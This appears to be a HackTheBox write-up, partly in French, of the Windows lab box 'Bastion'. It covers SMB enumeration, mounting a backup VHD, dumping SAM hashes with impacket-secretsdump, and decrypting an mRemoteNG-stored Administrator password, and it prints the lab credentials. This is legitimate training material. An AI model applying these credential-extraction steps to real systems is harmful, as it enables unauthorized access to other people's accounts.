---
title: HTB | Bastion
description: Bastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted.
slug: bastion-htb
date: 2025-03-03 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Windows
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Bastion cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Bastion</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.134</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
L4mpje : bureaulampje
Administrator : thXLHM96BeKL0ER2
Peter : 3RTTT5zNt2
```

## Enumeration

### nmap

```bash                
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.134
PORT      STATE SERVICE      REASON          VERSION
22/tcp    open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb2-time: 
|   date: 2025-02-27T22:08:39
|_  start_date: 2025-02-27T22:04:13
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-27T23:08:38+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51775/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18741/udp): CLEAN (Failed to receive data)
|   Check 4 (port 15523/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Foothold

### SMB "backups" share
```bash
┌──(kali㉿kali)-[~/htb/Bastion]
└─$ smbclient --no-pass -L //10.10.10.134

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Mount backup windows disk VDB
```bash
guestmount -a ./9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/vhd_mount 
```

### Retrieve hashes from Windows files 
```bash
┌──(root㉿kali)-[/home/kali/htb/Bastion]
└─# cp /mnt/vhd_mount/Windows/System32/config/SAM .
cp /mnt/vhd_mount/Windows/System32/config/SYSTEM .
cp /mnt/vhd_mount/Windows/System32/config/SECURITY .
                        
┌──(root㉿kali)-[/home/kali/htb/Bastion]
└─# ls
SAM  SECURITY  SYSTEM
                        
┌──(root㉿kali)-[/home/kali/htb/Bastion]
└─# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

### Hashcat bruteforce
On a la confirmation que le mot de passe est bien: bureaulampje
```bash
hashcat -m 1000 hash.txt ~/wordlists/rockyou.txt --show  
26112010952d963c8dc4217daec986d9:bureaulampje
```

### SSH L4mpje
```bash
┌──(kali㉿kali)-[~]
└─$ ssh L4mpje@10.10.10.134
Password: bureaulampje

Microsoft Windows [Version 10.0.14393]      
(c) 2016 Microsoft Corporation. All rights reserved.                                  

l4mpje@BASTION C:\Users\L4mpje>whoami       
bastion\l4mpje

l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt                                  
1018.....3717
```

### Recycle Bin - Peter username/pass
```bash
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> dir -ah                                  
                        
                        
    Directory: C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002                               
                        
                        
Mode                LastWriteTime         Length Name             
----                -------------         ------ ----             
-a-hs-        22-2-2019     13:50            129 desktop.ini      
                        
                        
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat .\desktop.ini                        
[.ShellClassInfo]       
CLSID={645FF040-5081-101B-9F08-00AA002F954E}                      
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964    
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> Get-ChildItem                            
                        
                        
    Directory: C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002                               
                        
                        
Mode                LastWriteTime         Length Name             
----                -------------         ------ ----             
-a----        22-2-2019     13:56            214 $I1MMX2E.txt     
-a----        22-2-2019     13:56            218 $INTSJCP.bat     
-a----        22-2-2019     13:54             67 $R1MMX2E.txt     
-a----        22-2-2019     13:56             58 $RNTSJCP.bat     
                        
                        
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> Get-ChildItem -Force                     
                        
                        
    Directory: C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002                               
                        
                        
Mode                LastWriteTime         Length Name             
----                -------------         ------ ----             
-a----        22-2-2019     13:56            214 $I1MMX2E.txt     
-a----        22-2-2019     13:56            218 $INTSJCP.bat     
-a----        22-2-2019     13:54             67 $R1MMX2E.txt     
-a----        22-2-2019     13:56             58 $RNTSJCP.bat     
-a-hs-        22-2-2019     13:50            129 desktop.ini      
                        
                        
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat '$RNTSJCP.bat'                       
NET USE Z: "\\192.168.1.74\Backups" /user:Peter 3RTTT5zNt2        
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> date                                     
                        
maandag 3 maart 2025 00:05:57                                     
                        
                        
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat '$I1MMX2E.txt'                       
        C       P9c ®ÊÔ]]   C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                       
S t a r t   M e n u \ P r o g r a m s \ S t a r t u p \ L 4 m p j e . b a t . t x t                         
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat '$INTSJCP.bat'                       
       :      
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                          
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
        :         C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                  C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                   ®ÊÔ_   C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                         
                   ®®ÊÔ__   C : \ U s e r s \ L 4 m p j e \ A p p D a t a \ R o a m i n g \ M i c r o s o f t \ W i n d o w s \                       
S t a r t   M e n u \ P r o g r a m s \ S t a r t u p \ P e t e r - s c r i p t . b a t                     
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat '$R1MMX2E.txt'                       
NET USE Z: "\\192.168.1.74\Backups" /user:L4mpje /pass:bureaulampje                                         
PS C:\$Recycle.Bin\S-1-5-21-2146344083-2443430429-1430880910-1002> cat '$RNTSJCP.bat'                       
NET USE Z: "\\192.168.1.74\Backups" /user:Peter 3RTTT5zNt2                          
```

## Privilege Escalation

### mRemoteNG
En regardant les logiciels installés de plus près, on observe un logiciel intéressant et suspect. Il permet de se connecter à des systèmes en s'authentificant avec des mots de passe stocker dans sa configuration.

### Recuperation du fichier de configuration

En cherchant sur internet on trouve cette info :
```bash
%APPDATA%\mRemoteNG\confCons.xml
```

Ce fichier semble contenir les mots de passe d'après un internaute.
Après vérification, on retrouve le hachage du mot de passe de l'Administrateur ainsi que celui de L4mpje :
```bash
PS C:\Users\L4mpje\Appdata\Roaming\mRemoteNG> ls                  
                        
                        
    Directory: C:\Users\L4mpje\Appdata\Roaming\mRemoteNG          
                        
                        
Mode                LastWriteTime         Length Name             
----                -------------         ------ ----             
d-----        22-2-2019     14:01                Themes           
-a----        22-2-2019     14:03           6316 confCons.xml     
-a----        22-2-2019     14:02           6194 confCons.xml.20190222-1402277353.backup                    
-a----        22-2-2019     14:02           6206 confCons.xml.20190222-1402339071.backup                    
-a----        22-2-2019     14:02           6218 confCons.xml.20190222-1402379227.backup                    
-a----        22-2-2019     14:02           6231 confCons.xml.20190222-1403070644.backup                    
-a----        22-2-2019     14:03           6319 confCons.xml.20190222-1403100488.backup                    
-a----        22-2-2019     14:03           6318 confCons.xml.20190222-1403220026.backup                    
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403261268.backup                    
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403272831.backup                    
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403433299.backup                    
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403486580.backup                    
-a----        22-2-2019     14:03             51 extApps.xml      
-a----        22-2-2019     14:03           5217 mRemoteNG.log    
-a----        22-2-2019     14:03           2245 pnlLayout.xml    
                        
                        
PS C:\Users\L4mpje\Appdata\Roaming\mRemoteNG> cat .\confCons.xml  
<?xml version="1.0" encoding="utf-8"?>                            
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC                      
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0                      
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                        
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                      
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="                      
...
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"                      
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"
 ...
```
Donc :
Administrator : `aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==`

### Déchiffrement du hachage de l'Administrateur

Un outil est dispo sur github pour cracker ce genre de fichier :
https://github.com/haseebT/mRemoteNG-Decrypt

```bash
┌──(kali㉿kali)-[~/htb/Bastion/mRemoteNG-Decrypt]
└─$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

### Connection en SSH - root flag
```bash
┌──(kali㉿kali)-[~/htb/Bastion]
└─$ ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password: ** thXLHM96BeKL0ER2 **

Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>type Desktop\root.txt                                                              
e90b.....42f6  
```